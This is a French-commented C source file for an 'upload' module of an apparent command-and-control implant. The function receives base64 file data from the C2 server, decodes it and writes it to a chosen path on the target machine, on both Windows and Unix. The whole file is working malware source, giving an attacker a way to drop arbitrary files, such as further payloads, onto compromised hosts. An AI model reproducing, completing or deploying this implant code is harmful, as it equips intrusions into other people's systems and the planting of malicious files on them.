/*
 * ============================================================
 *  modules/mod_upload.c — Module upload
 *
 *  Rôle : Recevoir un fichier encodé en base64 depuis le
 *         serveur C2 et l'écrire sur la cible.
 *
 *  Protocole :
 *    - ctx->command  : "upload <dest>"
 *    - ctx->b64_data : contenu du fichier encodé base64
 *    - ctx->filename : nom du fichier source (ex: "report.pdf")
 *                      Utilisé si <dest> est un dossier.
 *
 *  Défense en profondeur : si <dest> est un dossier existant,
 *  le nom de fichier source est automatiquement ajouté.
 * ============================================================
 */
#include "../platform.h"
#include "../config.h"
#include "../utils.h"
#include "module.h"

/**
 * Décode ctx->b64_data et écrit le résultat à la destination
 * spécifiée dans ctx->command ("upload <dest>").
 * Retourne 1 si succès, 0 si erreur.
 */
int mod_upload_exec(ModuleContext *ctx) {
    /*
     * command  : "upload <dest>"  — chemin complet ou dossier
     * b64_data : contenu du fichier encodé base64
     * filename : nom original du fichier source (ex: "test.txt")
     *            fourni par le champ JSON "filename" du serveur.
     *            Utilisé si <dest> est un dossier.
     */
    char dest[1024] = {0};
    extract_path(ctx->command, "upload ", dest, sizeof(dest));
    if (!dest[0]) {
        strncpy(ctx->output, "[ERREUR] Usage: upload <destination>",
                ctx->output_size - 1);
        return 0;
    }
    if (!ctx->b64_data || !ctx->b64_data[0]) {
        strncpy(ctx->output, "[ERREUR] Données base64 manquantes",
                ctx->output_size - 1);
        return 0;
    }

#ifdef PLATFORM_WINDOWS
    /* Défense en profondeur : si dest est un dossier, concatène le filename */
    DWORD attr = GetFileAttributesA(dest);
    if (attr != INVALID_FILE_ATTRIBUTES && (attr & FILE_ATTRIBUTE_DIRECTORY)) {
        if (!ctx->filename || !ctx->filename[0]) {
            snprintf(ctx->output, ctx->output_size,
                     "[ERREUR] Destination est un dossier: %s  — specifiez un chemin complet",
                     dest);
            return 0;
        }
        size_t dlen = strlen(dest);
        if (dest[dlen-1] != '\\' && dest[dlen-1] != '/')
            strncat(dest, "\\", sizeof(dest) - dlen - 1);
        strncat(dest, ctx->filename, sizeof(dest) - strlen(dest) - 1);
    }
#else
    {
        struct stat st;
        if (stat(dest, &st) == 0 && S_ISDIR(st.st_mode)) {
            if (!ctx->filename || !ctx->filename[0]) {
                snprintf(ctx->output, ctx->output_size,
                         "[ERREUR] Destination est un dossier: %s  — specifiez un chemin complet",
                         dest);
                return 0;
            }
            size_t dlen = strlen(dest);
            if (dest[dlen-1] != '/')
                strncat(dest, "/", sizeof(dest) - dlen - 1);
            strncat(dest, ctx->filename, sizeof(dest) - strlen(dest) - 1);
        }
    }
#endif

    /* ── Décodage base64 ────────────────────────────────────── */
    const char *b64    = ctx->b64_data;
    size_t  b64_len    = strlen(b64);
    size_t  max_dec    = (b64_len / 4) * 3 + 4;
    unsigned char *dec = malloc(max_dec);
    if (!dec) return 0;

    size_t out_pos = 0;
    for (size_t i = 0; i + 3 < b64_len; i += 4) {
        int v0 = B64_DEC[(unsigned char)b64[i]];
        int v1 = B64_DEC[(unsigned char)b64[i+1]];
        int v2 = (b64[i+2] != '=') ? B64_DEC[(unsigned char)b64[i+2]] : 0;
        int v3 = (b64[i+3] != '=') ? B64_DEC[(unsigned char)b64[i+3]] : 0;
        if (v0 < 0 || v1 < 0) break;
        dec[out_pos++] = (v0 << 2) | (v1 >> 4);
        if (b64[i+2] != '=') dec[out_pos++] = (v1 << 4) | (v2 >> 2);
        if (b64[i+3] != '=') dec[out_pos++] = (v2 << 6) | v3;
    }

    /* ── Écriture sur le disque ─────────────────────────────── */
    FILE *f = fopen(dest, "wb");
    if (!f) {
        free(dec);
        snprintf(ctx->output, ctx->output_size,
                 "[ERREUR] Impossible de créer: %s", dest);
        return 0;
    }
    fwrite(dec, 1, out_pos, f);
    fclose(f); free(dec);

    snprintf(ctx->output, ctx->output_size,
             "[OK] Fichier écrit: %s (%zu bytes)", dest, out_pos);
    return 1;
}
